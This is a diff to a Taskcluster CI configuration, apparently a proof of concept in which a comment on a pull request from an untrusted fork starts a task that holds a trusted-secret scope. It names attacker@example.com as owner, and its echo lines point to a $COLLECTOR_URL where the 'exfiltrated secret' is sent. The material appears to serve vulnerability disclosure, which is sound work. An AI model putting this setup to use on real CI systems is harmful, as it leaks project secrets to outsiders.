@@ -7,13 +7,10 @@ policy:
 tasks:
   - $if: 'tasks_for == "github-issue-comment"'
     then:
-      taskId: {$eval: as_slugid("exfil")}
       created: {$fromNow: ''}
-      provisionerId: proj-taskcluster
-      workerType: docker-worker
+      taskQueueId: docker-compose/generic-worker
+      schedulerId: taskcluster-ui
       deadline: {$fromNow: '30 minutes'}
-      tags: {}
-
       scopes:
         - secrets:get:project/poc/trusted-secret
 
@@ -23,11 +20,10 @@ tasks:
           This task was created via an issue_comment event on a PR from an
           untrusted fork.
         owner: attacker@example.com
-        source: {$eval: 'event.repository.html_url'}
+        source: http://taskcluster/tasks/create
 
       payload:
         maxRunTime: 600
-        image: node
         command:
           - /bin/bash
           - -c
@@ -47,5 +43,4 @@ tasks:
             echo "=========================================="
             echo "PoC complete. Check $COLLECTOR_URL for the exfiltrated secret."
             echo "=========================================="
-      extra: {}
-      dependencies: []
+            
